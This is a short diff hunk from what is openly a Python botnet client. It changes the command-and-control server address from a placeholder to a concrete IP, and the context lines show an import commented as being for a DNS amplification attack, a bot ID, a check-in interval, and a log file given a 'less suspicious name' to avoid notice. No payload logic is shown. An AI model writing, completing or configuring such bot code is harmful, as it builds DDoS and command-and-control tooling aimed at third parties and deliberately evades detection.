@@ -22,7 +22,7 @@ import dns.resolver  # For DNS amplification attack
 from datetime import datetime
 
 # Configuration
-C2_SERVER = "http://your-c2-server:8080 "  # Replace with your actual C2 server address
+C2_SERVER = "http://192.168.100.7:8080 "  # Replace with your actual C2 server address
 CHECK_IN_INTERVAL = 60  # Seconds between check-ins
 BOT_ID = str(uuid.uuid4())  # Generate unique bot ID
 LOG_FILE = "system_service.log"  # Less suspicious name
